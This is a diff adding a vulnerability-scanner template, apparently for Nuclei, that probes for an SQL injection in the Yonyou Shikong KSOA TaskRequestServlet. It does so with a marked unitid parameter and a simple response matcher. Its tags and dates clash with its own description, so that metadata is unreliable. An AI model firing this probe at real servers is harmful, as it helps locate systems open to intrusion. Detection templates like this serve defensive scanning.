@@ -1,0 +1,30 @@
+id: 用友时空 KSOATaskRequestServlet sql注入漏洞
+time: "2023-05-22"
+info:
+  severity: critical
+  description: 用友时空 KSOATaskRequestServlet sql注入漏洞，攻击者通过漏洞可以获取服务器权限。
+  remediation: Apply the appropriate patch.
+  tags: zhiyuan,rce,fileupload,seeyon,intrusive
+  fofa: app="用友-时空KSOA"
+  metadata:
+    max-request: 1
+
+http:
+  - method: 
+      - GET
+
+    path:
+      - "{{BaseURL}}/servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet?unitid=1*&password=1"
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "error"
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by mp on 2022/02/04
